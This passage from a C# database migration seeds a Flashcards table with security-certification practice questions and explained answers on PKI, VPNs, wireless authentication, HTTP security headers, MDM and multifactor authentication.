                values: new object[] { 443, "\r\n37. C. Certificate revocation lists (CRLs) are designed specifically\r\nfor revoking certificates. Since public keys are distributed via\r\ncertificates, this is the most effective way to deauthorize a public\r\nkey. Option A is incorrect. Simply notifying users that a\r\nkey/certificate is no longer valid is not effective. Option B is\r\nincorrect. Deleting a certificate is not always possible and\r\nignores the possibility of a duplicate of that certificate existing.\r\nOption D is incorrect. The registration authority (RA) is used in\r\ncreating new certificates, not in revoking them.\r\n", 3, "\r\n37. Nick is responsible for cryptographic keys in his company. What is the best way to deauthorize\r\na public key?\r\nA. Send out a network alert.\r\nB. Delete the digital certificate.\r\nC. Publish that certificate in the CRL.\r\nD. Notify the RA.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 444, "\r\n38. C. Global Positioning System (GPS) data and data about local\r\nWi-Fi networks are the two most commonly used protocols to\r\nhelp geofencing applications determine where they are. When a\r\nknown Wi-Fi signal is gained or lost, the geofencing application\r\nknows it is within range of that network. GPS data is even more\r\nuseful because it can work in most locations and provide\r\naccurate location data. Although Bluetooth is sometimes used\r\nfor geofencing, its limited range means that it is a third choice.\r\nCellular information would require accurate tower-based\r\ntriangulation, which means it is not typically used for geofencing\r\napplications, and of course USB is a wired protocol.\r\n", 3, "\r\n38. What two connection methods are used for most geofencing applications?\r\nA. Cellular and GPS\r\nB. USB and Bluetooth\r\nC. GPS and Wi-Fi\r\nD. Cellular and Bluetooth\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 445, "\r\n39. A. The demilitarized zone (DMZ) is a zone between an outer\r\nfirewall and an inner firewall. It is specifically designed as a\r\nplace to locate public-facing servers. The outer firewall is more\r\npermissive, thus allowing public access to the servers in the\r\nDMZ. However, the inner firewall is more secure, thus\r\npreventing outside access to the corporate network.\r\n", 3, "\r\n39. Gabriel is setting up a new e-commerce server. He is concerned about security issues. Which\r\nof the following would be the best location to place an e-commerce server?\r\nA. DMZ\r\nB. Intranet\r\nC. Guest network\r\nD. Extranet\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 446, "\r\n40. C. The first step in security is hardening the operating system,\r\nand one of the most elementary aspects of that is turning off\r\nunneeded services. This is true regardless of the operating\r\nsystem. Although installing antimalware, implementing usage\r\npolicies, and setting password reuse policies are all good\r\npractices, turning off unnecessary services is typically the first\r\nstep in securing a system.\r\n", 3, "\r\n40. Janelle is the security administrator for a small company. She is trying to improve security\r\nthroughout the network. Which of the following steps should she take first?\r\nA. Implement antimalware on all computers.\r\nB. Implement acceptable use policies.\r\nC. Turn off unneeded services on all computers.\r\nD. Set password reuse policies.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 447, "\r\n41. C. Knowledge-based authentication requires information that\r\nonly the user is likely to know. Examples include things like\r\nprevious tax payments, bill amounts, and similar information.\r\nRequesting a Social Security number is less secure and would\r\nonly work for users in the United States. Federated identity via\r\nGoogle accounts does not meet this need because Google\r\naccounts do not have a user validation requirement. Finally,\r\nvalidation emails only prove that the user has access to an\r\naccount that they provide, not that they are a specific individual.\r\n", 3, "\r\n41. Ben is responsible for a new application with a worldwide user base that will allow users\r\nto sign up to access existing data about them. He would like to use a method of authentication\r\nthat will permit him to verify that users are the correct people to match up with their\r\naccounts. How can he validate these users?\r\nA. Require that they present their Social Security number.\r\nB. Require them to use a federated identity via Google.\r\nC. Require them to use knowledge-based authentication.\r\nD. Require them to validate an email sent to the account they signed up with.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 448, "\r\n42. A. A Transport Layer Security (TLS) VPN is frequently chosen\r\nwhen ease of use is important, and web applications are the\r\nprimary usage mode. IPSec VPNs are used for site-to-site VPNs\r\nand for purposes where other protocols may be needed, because\r\nthey make the endpoint system appear to be on the remote\r\nnetwork.\r\n", 3, "\r\n42. Jason wants to implement a remote access virtual private network (VPN) for users in his\r\norganization who primarily rely on hosted web applications. What common VPN type is best\r\nsuited to this if he wants to avoid deploying client software to his end-user systems?\r\nA. A TLS VPN\r\nB. An RDP (Remote Desktop Protocol) VPN\r\nC. An Internet Control Message Protocol (ICMP) VPN\r\nD. An IPSec VPN\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 449, "\r\n43. A. Full-disk encryption (FDE) fully encrypts the hard drive on a\r\ncomputer. This is an effective method for ensuring the security\r\nof data on a computer. Trusted Platform Modules (TPMs) are\r\nstore keys and are used for boot integrity and other\r\ncryptographic needs and won’t directly protect the data.\r\nSoftware-defined networking (SDN) is virtualized networking,\r\nand demilitarized zones (DMZs) are used to segment a network\r\nand won’t affect this problem.\r\n", 3, "\r\n43. Juan is a network administrator for an insurance company. His company has a number of\r\ntraveling salespeople. He is concerned about confidential data on their laptops. What is the\r\nbest way for him to address this?\r\nA. FDE\r\nB. TPM\r\nC. SDN\r\nD. DMZ\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 438, "\r\n32. C. Many subscription services allow for data retrieval via\r\nHTTPS. Ted can subscribe to one or more threat feeds or\r\nreputation services, and then feed that information to an\r\nintrusion detection system (IDS), intrusion prevention system\r\n(IPS), next -generation firewall, or similar network security tool.\r\nSecurity Assertion Markup Language (SAML) is used to make\r\nassertions about identities and authorization, a VDI is a virtual\r\ndesktop environment, and FDE is full-disk encryption.\r\n", 3, "\r\n32. Ted wants to use IP reputation information to protect his network and knows that third\r\nparties provide that information. How can he get this data, and what secure protocol is he\r\nmost likely to use to retrieve it?\r\nA. A subscription service, SAML\r\nB. A VDI, XML\r\nC. A subscription service, HTTPS\r\nD. An FDE, XML\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 424, "\r\n18. B. A registration authority, or RA, receives requests for new\r\ncertificates as well as renewal requests for existing certificates.\r\nThey can also receive revocation requests and similar tasks. An\r\nintermedia CA is trusted by the root CA to issue certificates. A\r\nCRL is a certificate revocation list.\r\n", 3, "\r\n18. Greg is setting up a public key infrastructure (PKI). He creates an offline root certificate\r\nauthority (CA) and then needs to issue certificates to users and devices. What system or\r\ndevice in a PKI receives certificate signing requests (CSRs) from applications, systems,\r\nand users?\r\nA. An intermedia CA\r\nB. An RA\r\nC. A CRL\r\nD. None of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 423, "\r\n17. A. Certificate stapling allows the server that is presenting a\r\ncertificate to provide a more efficient way to check the\r\nrevocation status of the certificate via the Online Certificate\r\nStatus Protocol (OCSP) by including the OCSP response with the\r\nhandshake for the certificate. This provides both greater security\r\nbecause clients know that the certificate is valid, and greater\r\nefficiency because they don’t have to perform a separate\r\nretrieval to check the certificate’s status. The rest of the options\r\nwere made up and are not certificate stapling.\r\n", 3, "\r\n17. What occurs when a certificate is stapled?\r\nA. Both the certificate and OCSP responder are sent together to prevent additional\r\nretrievals during certificate path validation.\r\nB. The certificate is stored in a secured location that prevents the certificate from being\r\neasily removed or modified.\r\nC. Both the host certificate and the root certificate authority’s private key are attached to\r\nvalidate the authenticity of the chain.\r\nD. The certificate is attached to other certificates to demonstrate the entire certificate chain.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 422, "\r\n16. A. File Transfer Protocol Secure (FTPS) typically uses port 990\r\nfor implicit FTPS and port 21, the normal FTP command port, is\r\nused for explicit FTPS. Port 22 is used for SSH, 433 was used for\r\nthe Network News Transfer Protocol (NNTP), 1433 is used for\r\nMicrosoft SQL, and port 20 is used for FTP.\r\n", 3, "\r\n16. What two ports are most commonly used for FTPS traffic?\r\nA. 21, 990\r\nB. 21, 22\r\nC. 433, 1433\r\nD. 20, 21\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 397, "\r\n180. B. Alaina’s need for a local, secure storage area is an ideal\r\nsituation for the use of a vault or safe where the keys can be\r\nstored on a device like a thumb drive. Simply placing them on a\r\ndrive leaves them vulnerable to theft, and an air-gapped system\r\nwould also be potentially exposed to theft or local breaches.\r\n", 2, "\r\n180. Alaina needs to physically secure the root encryption keys for a certificate authority. What\r\ntype of security device should she use to maintain local control and security for them?\r\nA. A USB thumb drive\r\nB. A vault or safe\r\nC. An air-gapped system\r\nD. None of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 398, "\r\n181. B. It is critical to authenticate API users and then to authorize\r\nthem to take actions. If you authorized first and then\r\nauthenticated, users could take action before you knew who they\r\nwere! Encrypting throughout the use of the API keeps data and\r\nqueries secure, validating input and filtering out dangerous\r\nstrings is important to prevent injection and other attacks, and\r\nauditing and logging allows you to troubleshoot and respond to\r\nissues and attacks.\r\n", 2, "\r\n181. Angela wants to help her organization use APIs more securely and needs to select three\r\nAPI security best practices. Which of the following options is not a common API security\r\nbest practice?\r\nA. Use encryption throughout the API’s request/response cycle.\r\nB. Authorize before authenticating.\r\nC. Do not trust input strings and validate parameters.\r\nD. Enable auditing and logging.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 399, "\r\n182. C. Frank has used a degausser to erase the data on the tapes.\r\nDegaussing only works on magnetic media like tapes and will\r\nnot work on optical or flash media. Burning media or materials\r\nis exactly what it sounds like—putting them into a fire!\r\nShredding and pulping are mechanical means of destruction.\r\n", 2, "\r\n182. Frank uses a powerful magnet to wipe tapes before they are removed from his organization’s\r\ninventory. What type of secure data destruction technique has he used?\r\nA. Tape burning\r\nB. Data shredding\r\nC. Degaussing\r\nD. Pulping\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 400, "\r\n183. A. 5G requires higher antenna density for full bandwidth\r\ncommunication than previous technologies, meaning that\r\nAngela’s organization will have to carefully consider antenna\r\nplacement, particularly inside buildings where structural\r\nelements can create challenges with signal propagation. 5G is\r\nusable indoors, is commercially available, and can coexist with\r\ntraditional Wi-Fi, so Angela should not include those in her list\r\nof concerns.\r\n", 2, "\r\n183. Angela has been asked to deploy 5G cellular inside her organization. What concern should\r\nshe raise with her management about the effort to implement it?\r\nA. 5G requires high levels of antenna density for full coverage.\r\nB. 5G signals should only be used in exterior deployments.\r\nC. 5G is not widely available and cannot be deployed yet.\r\nD. 5G signals cannot coexist with traditional Wi-Fi.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 401, "\r\n184. A. Chris is concerned about privilege creep, the slow\r\naccumulation of privileges over time as staff members change\r\nroles and their privileges are not removed or updated. Privilege\r\nmanagement processes would help to prevent this, thus keeping\r\ndata more secure. Of the other options, only privilege escalation\r\nis a common term, and it means gaining additional privileges,\r\ntypically as part of an attack from an account with fewer\r\nprivileges to a more privileged account like an administrator or\r\nroot account.\r\n", 2, "\r\n184. Chris is reviewing the rights that staff in his organization have to data stored in a group of\r\ndepartmental file shares. He is concerned that rights management practices have not been\r\nfollowed and that employees who have been with the company he works for have not had\r\ntheir privileges removed after they switched jobs. What type of issue has Chris encountered?\r\nA. Privilege creep\r\nB. IAM inflation\r\nC. Masking issues\r\nD. Privilege escalation\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 402, "\r\n185. C. Honeyfiles are files that are intended to help detect\r\nattackers. They are placed in a location where accessing them\r\ncan be detected but are not set up to allow users to access them.\r\nThat means that attackers who access the seemingly desirable\r\nfile can be easily detected and appropriate alerts can be sent.\r\n", 2, "\r\n185. Isaac has been asked to set up a honeyfile. What should he configure?\r\nA. A list of tasks to accomplish\r\nB. A list of potentially valuable data\r\nC. A bait file for attackers to access\r\nD. A vulnerable Word file\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 403, "\r\n186. C. Although there is no specific recommended distance,\r\nrecommendations typically range from 60 to 120 miles away to\r\nensure that a single disaster is unlikely to disable both locations.\r\n", 2, "\r\n186. Yasmine wants to ensure that she has met a geographic dispersal requirement for her datacenters.\r\nHow far away should she place her datacenter based on common best practices for\r\ndispersal?\r\nA. 5 miles\r\nB. 45 miles\r\nC. 90 miles\r\nD. 150 miles\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 404, "\r\n187. B. Fog computing is a term coined by Cisco to describe cloud\r\ncomputing at the edge of an enterprise network. The more\r\ncommon term for this is edge computing, but you may\r\nencounter both terms. Fog implementations handle significant\r\namounts of computation, communication, and storage activities\r\nlocally, while also connecting to cloud services to perform some\r\nof the work.\r\n", 2, "\r\n187. What term describes extending cloud computing to the edge of an enterprise network?\r\nA. Local cloud\r\nB. Fog computing\r\nC. Managed cloud\r\nD. Blade computing\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 405, "\r\n188. A. Bcrypt, scrypt, and PBKDF2 are all examples of key\r\nstretching algorithms. MD5 and SHA1 are both hashing\r\nalgorithms, and ncrypt was made up for this question.\r\n", 2, "\r\n188. Which of the following algorithms is a key stretching algorithm?\r\nA. bcrypt\r\nB. ncrypt\r\nC. MD5\r\nD. SHA1\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 406, "\r\n189. C. The only directory service listed is Lightweight Directory\r\nAccess Protocol (LDAP). SAML is Security Assertion Markup\r\nLanguage, OAuth is an authorization delegation protocol, and\r\n802.1x is a network authentication protocol.", 2, "\r\n189. Jocelyn has been asked to implement a directory service. Which of the following\r\ntechnologies should she deploy?\r\nA. SAML\r\nB. OAuth\r\nC. LDAP\r\nD. 802.1x", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 407, "1. A. Dual control, which requires two individuals to perform a\r\nfunction; split knowledge, which splits the passphrase or key\r\nbetween two or more people; and separation of duties, which\r\nensures that a single individual does not control or oversee the\r\nentire process all help prevent insider threats when managing a\r\nPKI. Requiring a new passphrase when a certificate is used is\r\nnot a reasonable solution and would require reissuing the\r\ncertificate.\r\n", 3, "1. Adam is setting up a public key infrastructure (PKI) and knows that keeping the passphrases\r\nand encryption keys used to generate new keys is a critical part of how to ensure that the\r\nroot certificate authority remains secure. Which of the following techniques is not a common\r\nsolution to help prevent insider threats?\r\nA. Require a new passphrase every time the certificate is used.\r\nB. Use a split knowledge process for the password or key.\r\nC. Require dual control.\r\nD. Implement separation of duties.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 408, "\r\n2. B. A site survey is the process of identifying where access points\r\nshould be located for best coverage and identifying existing\r\nsources of RF interference, including preexisting wireless\r\nnetworks and other devices that may use the same radio\r\nfrequency spectrum. By conducting a site survey, Naomi can\r\nguide the placement of her access points as well as create a\r\nchannel design that will work best for her organization.\r\n", 3, "\r\n2. Naomi is designing her organization’s wireless network and wants to ensure that the design\r\nplaces access points in areas where they will provide optimum coverage. She also wants to\r\nplan for any sources of RF interference as part of her design. What should Naomi do first?\r\nA. Contact the FCC for a wireless map.\r\nB. Conduct a site survey.\r\nC. Disable all existing access points.\r\nD. Conduct a port scan to find all existing access points.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 409, "\r\n3. B. The option that best meets the needs described above is\r\nPEAP, the Protected Extensible Authentication Protocol. PEAP\r\nrelies on server-side certificates and relies on tunneling to\r\nensure communications security. EAP-MD5 is not\r\nrecommended for wireless networks and does not support\r\nmutual authentication of the wireless client and network. LEAP,\r\nthe Lightweight Extensible Authentication Protocol, uses WEP\r\nkeys for its encryption and is not recommended due to security\r\nissues. Finally, EAP-TLS, or EAP Transport Layer Security,\r\nrequires certificates on both the client and server, consuming\r\nmore management overhead.\r\n", 3, "\r\n3. Chris is preparing to implement an 802.1X-enabled wireless infrastructure. He knows that\r\nhe wants to use an Extensible Authentication Protocol (EAP)-based protocol that does not\r\nrequire client-side certificates. Which of the following options should he choose?\r\nA. EAP-MD5\r\nB. PEAP\r\nC. LEAP\r\nD. EAP-TLS\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 410, "\r\n4. C. East-west traffic is traffic sent laterally inside a network.\r\nSome networks focus security tools at the edges or places where\r\nnetworks interconnect, leaving internal, or east-west, traffic\r\nopen. In zero-trust environments, internal traffic is not\r\npresumed to be trustworthy, reducing the risks of this type of\r\nlateral communication. Side-stepping, slider traffic, and peer\r\ninterconnect were all made up for this question, although peer\r\ninterconnect may sound similar to peer-to-peer traffic, which\r\nmay be lateral in many networks.\r\n", 3, "\r\n4. What term is commonly used to describe lateral traffic movement within a network?\r\nA. Side-stepping\r\nB. Slider traffic\r\nC. East-west traffic\r\nD. Peer interconnect\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 411, "\r\n5. C. Although preventing Multipurpose Internet Mail Extensions\r\n(MIME) sniffing may sound humorous, MIME sniffing can be\r\nused in cross-site scripting attacks, and the X-Content-Type-\r\nOptions header helps prevent MIME sniffing. HTTP securityoriented\r\nheaders can also set X-Frame options, turn on crosssite\r\nscripting protection, set content security policies, and\r\nrequire transport security. There isn’t a “Disable SQL injection”\r\nheader, however!\r\n", 3, "\r\n5. Charlene wants to use the security features built into HTTP headers. Which of the following\r\nis not an HTTP header security option?\r\nA. Requiring transport security\r\nB. Preventing cross-site scripting\r\nC. Disabling SQL injection\r\nD. Helping prevent MIME sniffing\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 412, "\r\n6. C. Mobile device management (MDM) suites often provide the\r\nability to manage content on devices as well as applications.\r\nUsing content management tools can allow Charlene to\r\nprovision files, documents, and media to the devices that staff\r\nmembers in her organization are issued. Application\r\nmanagement would be useful for apps. Remote wipe can remove\r\ndata and applications from the device if it is lost or stolen, or an\r\nemployee leaves the organization. Push notifications are useful\r\nwhen information needs to be provided to the device user.\r\n", 3, "\r\n6. Charlene wants to provision her organization’s standard set of marketing information to\r\nmobile devices throughout her organization. What MDM feature is best suited to this task?\r\nA. Application management\r\nB. Remote wipe\r\nC. Content management\r\nD. Push notifications\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 413, "\r\n7. C. In this scenario, Denny specifically needs to ensure that he\r\nstops the most malware. In situations like this, vendor diversity\r\nis the best way to detect more malware, and installing a different\r\nvendor’s antivirus (AV) package on servers like email servers\r\nand then installing a managed package for PCs will result in the\r\nmost detections in almost all cases. Installing more than one AV\r\npackage on the same system is rarely recommended, since this\r\noften causes performance issues and conflicts between the\r\npackages—in fact, at times AV packages have been known to\r\ndetect other AV packages because of the deep hooks they place\r\ninto the operating system to detect malicious activity!\r\n", 3, "\r\n7. Denny wants to deploy antivirus for his organization and wants to ensure that it will stop the\r\nmost malware. What deployment model should Denny select?\r\nA. Install antivirus from the same vendor on individual PCs and servers to best balance visibility,\r\nsupport, and security.\r\nB. Install antivirus from more than one vendor on all PCs and servers to maximize\r\ncoverage.\r\nC. Install antivirus from one vendor on PCs and from another vendor on the server to\r\nprovide a greater chance of catching malware.\r\nD. Install antivirus only on workstations to avoid potential issues with server performance.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 414, "\r\n8. B. Amanda has encountered a captive portal. Captive portals\r\nredirect all traffic to the portal page, either to allow the portal to\r\ncollect information or to display the page itself. Once users have\r\ncompleted the requirements that the portal puts in place, they\r\nare permitted to browse the Internet. This may be accomplished\r\nby assigning a new IP address or by allowing the connected IP\r\naddress to have access to the Internet using a firewall rule or\r\nother similar method. Preshared keys are used in wireless\r\nnetworks for authentication. Port security is used for wired\r\nnetworks, and WPA stands for Wi-Fi Protected Access, as in\r\nWPA, WPA-2, and WPA-3.\r\n", 3, "\r\n8. When Amanda visits her local coffee shop, she can connect to the open wireless without\r\nproviding a password or logging in, but she is immediately redirected to a website that asks\r\nfor her email address. Once she provides it, she is able to browse the Internet normally. What\r\ntype of technology has Amanda encountered?\r\nA. A preshared key\r\nB. A captive portal\r\nC. Port security\r\nD. A Wi-Fi protected access\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 415, "\r\n9. B. Domain Name System Security Extensions, or DNSSEC,\r\nprovides the ability to validate DNS data and denial of existence,\r\nand provides data integrity for DNS. It does not provide\r\nconfidentiality or availability controls. If Charles needs to\r\nprovide those, he will have to implement additional controls.\r\n", 3, "\r\n9. Charles has been asked to implement DNSSEC for his organization. Which of the following\r\ndoes it provide?\r\nA. Confidentiality\r\nB. Integrity\r\nC. Availability\r\nD. All of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 416, "\r\n10. B. Google is acting as an identity provider, or IdP. An IdP\r\ncreates and manages identities for federations. An RP is a\r\nrelying party, which relies on an identity provider. An SP is a\r\nservice provider, and an RA is a registration authority involved\r\nin the process for providing cryptographic certificates.\r\n", 3, "\r\n10. Sarah has implemented an OpenID-based authentication system that relies on existing\r\nGoogle accounts. What role does Google play in a federated environment like this?\r\nA. An RP\r\nB. An IdP\r\nC. An SP\r\nD. An RA\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 417, "\r\n11. C. SSH, or Secure Shell, is a secure protocol used to connect to\r\ncommand-line shells. SSH can also be used to tunnel other\r\nprotocols, making it a useful and frequently used tool for system\r\nadministrators, security professionals, and attackers. Using\r\nHTTPS or Transport Layer Security (TLS) for a secure command\r\nline is rare, and Telnet is an insecure protocol.\r\n", 3, "\r\n11. Ian needs to connect to a system via an encrypted channel so that he can use a command-line\r\nshell. What protocol should he use?\r\nA. Telnet\r\nB. HTTPS\r\nC. SSH\r\nD. TLS\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 418, "\r\n12. B. Of the options provided, only FIDO U2F, an open standard\r\nprovided by the Fast IDentity Online Alliance, is a standard for\r\nsecurity keys. Other standards that you may encounter include\r\nOTP (One Time Password), SmartCard, OATH-HOTP, and\r\nOpenPGP. Of note, OATH, the Initiative for Open Authentiation\r\nprovides standards both HMAC-based one time password\r\n(HOTP) and TOTP, or time-based one time passwords. SAML\r\n(Security Assertion Markup Language) and OpenID are both\r\nused in authentication processes but not for security keys. ARF\r\nwas made up for this question.\r\n", 3, "\r\n12. Casey is considering implementing password key devices for her organization. She wants to\r\nuse a broadly adopted open standard for authentication and needs her keys to support that.\r\nWhich of the following standards should she look for her keys to implement, in addition to\r\nbeing able to connect via USB, Bluetooth, and NFC?\r\nA. SAML\r\nB. FIDO\r\nC. ARF\r\nD. OpenID\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 419, "\r\n13. C. Nadia should use Secure/Multipurpose Internet Mail\r\nExtensions (S/MIME), which supports asymmetric encryption\r\nand should then use Danielle’s public key to encrypt the email so\r\nthat only Danielle can decrypt the messages and read them.\r\nSecure POP3 would protect messages while they’re being\r\ndownloaded but would not protect the content of the messages\r\nbetween servers.\r\n", 3, "\r\n13. Nadia is concerned about the content of her emails to her friend Danielle being read as they\r\nmove between servers. What technology can she use to encrypt her emails, and whose key\r\nshould she use to encrypt the message?\r\nA. S/MIME, her private key\r\nB. Secure POP3, her public key\r\nC. S/MIME, Danielle’s public key\r\nD. Secure POP3, Danielle’s private key\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 420, "\r\n14. B. SRTP is a secure version of the Real-Time Transport\r\nProtocol and is used primarily for Voice over IP (VoIP) and\r\nmultimedia streaming or broadcast. SRTP, as currently\r\nimplemented, does not fully protect packets, leaving RTP\r\nheaders exposed, potentially exposing information that might\r\nprovide attackers with information about the data being\r\ntransferred.\r\n", 3, "\r\n14. What type of communications is SRTP most likely to be used for?\r\nA. Email\r\nB. VoIP\r\nC. Web\r\nD. File transfer\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 421, "\r\n15. C. Olivia should make her organization aware that a failure in\r\none of the active nodes would result in less maximum\r\nthroughput and a potential for service degradation. Since\r\nservices are rarely run at maximum capacity, and many can have\r\nmaintenance windows scheduled, this does not mean that the\r\nload balancers cannot be patched. There is nothing in this\r\ndesign that makes the load balancers more vulnerable to denial\r\nof service than they would be under any other design.\r\n", 3, "\r\n15. Olivia is implementing a load-balanced web application cluster. Her organization already\r\nhas a redundant pair of load balancers, but each unit is not rated to handle the maximum\r\ndesigned throughput of the cluster by itself. Olivia has recommended that the load balancers\r\nbe implemented in an active/active design. What concern should she raise as part of this recommendation?\r\nA. The load balancer cluster cannot be patched without a service outage.\r\nB. The load balancer cluster is vulnerable to a denial-of-service attack.\r\nC. If one of the load balancers fails, it could lead to service degradation.\r\nD. None of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 340, "\r\n123. C. Object detection capabilities can detect specific types or\r\nclasses of objects and can be used to determine if the object is\r\nmoved. In this case, Nina could enable object detection to notify\r\nher when packages are delivered, and she may be able to\r\nspecifically select an object to monitor for additional security.\r\nInfrared capabilities are useful in low-light situations, motion\r\ndetection helps to preserve storage space by only recording\r\nwhen motion occurs, and facial recognition could help identify\r\nspecific individuals but won’t help with packages.\r\n", 2, "\r\n123. The company that Nina works for has suffered from recent thefts of packages from a lowsecurity\r\ndelivery area. What type of camera capability can they use to ensure that a recently\r\ndelivered package is properly monitored?\r\nA. Infrared image capture\r\nB. Motion detection\r\nC. Object detection\r\nD. Facial recognition\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 226, "\r\n9. B. The most common way to ensure that third-party secure\r\ndestruction companies perform their tasks properly is to sign a\r\ncontract with appropriate language and make sure that they\r\ncertify the destruction of the materials they are asked to destroy.\r\nManual on-site inspection by third parties is sometimes done as\r\npart of certification, but federal certification is not a common\r\nprocess. Requiring pictures of every destroyed document would\r\ncreate a new copy, thus making it a flawed process.\r\n", 2, "\r\n9. Naomi wants to hire a third-party secure data destruction company. What process is most\r\nfrequently used to ensure that third parties properly perform data destruction?\r\nA. Manual on-site inspection by federal inspectors\r\nB. Contractual requirements and a csertification process\r\nC. Requiring pictures of every destroyed document or device\r\nD. All of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 339, "\r\n122. A. TOTP, or time-based one-time password, algorithms rely on\r\nthe time being accurate between both of the authentication\r\nhosts. That means that if a system or device is not properly\r\nsynced to an authoritative and correct time server, or if its local\r\nsystem time has drifted, the authentication may fail. Although\r\nTOTP systems have some flexibility, a clock that is sufficiently\r\nincorrect will cause an issue. HMAC-based one-time password\r\n(HOTP) and short message service (SMS)-based multifactor\r\nsystems do not suffer from this issue, and MMAC was made up\r\nfor this question.\r\n", 2, "\r\n122. Which multifactor authentication can suffer from problems if the system or device’s time is\r\nnot correct?\r\nA. TOTP\r\nB. SMS\r\nC. HOTP\r\nD. MMAC\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
